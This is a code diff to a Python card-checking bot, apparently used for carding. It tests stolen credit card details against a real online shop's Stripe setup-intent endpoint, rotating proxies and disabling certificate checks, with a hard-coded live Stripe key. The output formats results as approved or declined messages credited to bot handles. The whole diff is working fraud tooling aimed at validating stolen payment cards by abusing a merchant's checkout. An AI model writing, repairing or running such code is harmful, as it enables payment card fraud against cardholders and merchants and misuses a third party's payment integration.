@@ -95,9 +95,6 @@ def get_bin_info(bin_number):
         }
 
 def classify_response(res):
-    if isinstance(res, str):
-        return "DECLINED CC", res, False
-        
     raw_text = json.dumps(res).lower()
     
     if res.get("status") == "succeeded":
@@ -114,7 +111,7 @@ def classify_response(res):
     return "DECLINED CC", res.get("error", {}).get("message", ""), False
 
 def check_card_stripe(cc_line):
-    """Check a single card using Stripe gateway"""
+    """Check a single card using Stripe gateway - Using the original working method"""
     start_time = time.time()
     
     try:
@@ -125,66 +122,53 @@ def check_card_stripe(cc_line):
         # Get proxy
         proxy = get_random_proxy()
         
-        # Get setup intent - try multiple endpoints
-        endpoints = [
+        # Get setup intent using the original working method
+        setup = requests.post(
             "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
-            "https://api.stripe.com/v1/setup_intents"
-        ]
+            data={"payment_method": "stripe_cc"},
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            proxies=proxy,
+            timeout=30,
+            verify=False
+        )
         
-        setup = None
-        client_secret = ""
-        secret = ""
-        
-        for endpoint in endpoints:
-            try:
-                setup = requests.post(
-                    endpoint,
-                    data={"payment_method": "stripe_cc"},
-                    headers={
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-                        "Accept": "application/json",
-                        "Content-Type": "application/x-www-form-urlencoded"
-                    },
-                    proxies=proxy,
-                    timeout=30,
-                    verify=False
-                )
-                
-                if setup.status_code == 200:
-                    try:
-                        setup_data = setup.json()
-                        client_secret = setup_data.get("client_secret", "")
-                        if client_secret:
-                            secret_parts = client_secret.split("_secret_")
-                            if len(secret_parts) >= 2:
-                                secret = secret_parts[0]
-                                break
-                    except:
-                        # Try to extract from text response
-                        if "client_secret" in setup.text:
-                            match = re.search(r'"client_secret":"([^"]+)"', setup.text)
-                            if match:
-                                client_secret = match.group(1)
-                                secret_parts = client_secret.split("_secret_")
-                                if len(secret_parts) >= 2:
-                                    secret = secret_parts[0]
-                                    break
-            except:
-                continue
-        
-        if not client_secret or not secret:
+        if setup.status_code != 200:
             elapsed_time = time.time() - start_time
             return f"""
 ❌ SETUP FAILED ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to get client secret from Stripe
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Setup failed with status {setup.status_code}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
 
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
+        
+        # Extract client_secret using the original method from cc.py
+        setup_text = setup.text
+        if '{"client_secret":"' not in setup_text:
+            elapsed_time = time.time() - start_time
+            return f"""
+❌ SETUP FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Client secret not found in response
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
+        # Extract client_secret using the original method
+        seti = setup_text.split('{"client_secret":"')[1].split('"}')[0]
+        secret = setup_text.split('{"client_secret":"')[1].split('_secret_')[0]
 
         # Confirm the setup intent with card details
         confirm = requests.post(
@@ -198,7 +182,7 @@ def check_card_stripe(cc_line):
                 "payment_method_data[billing_details][address][postal_code]": "10080",
                 "use_stripe_sdk": "true",
                 "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
-                "client_secret": client_secret
+                "client_secret": seti
             },
             headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
